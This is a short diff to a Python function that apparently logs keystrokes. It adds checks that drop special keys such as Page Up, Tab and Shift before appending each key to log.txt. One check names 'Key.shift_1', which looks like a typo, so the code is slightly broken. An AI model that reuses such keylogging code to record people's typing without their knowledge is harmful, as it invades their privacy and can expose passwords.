@@ -95,6 +95,33 @@ def write_to_file(key):
     if letter == 'Key.page_down':
         letter = ''
 
+    if letter == 'Key.page_up':
+        letter = ''
+
+    if letter == 'Key.pause':
+        letter = ''
+
+    if letter == 'Key.print_screen':
+        letter = ''
+
+    if letter == 'Key.right':
+        letter = ''
+
+    if letter == 'Key.scroll_lock':
+        letter = ''
+
+    if letter == 'Key.shift':
+        letter = ''
+
+    if letter == 'Key.shift_1':
+        letter = ''
+
+    if letter == 'Key.tab':
+        letter = ''
+
+    if letter == 'Key.up':
+        letter = ''
+
     with open("log.txt", 'a') as f:  # to create a file/open it and write to it.
         f.write(letter)  # writes to the file with the quoted text to the file
 
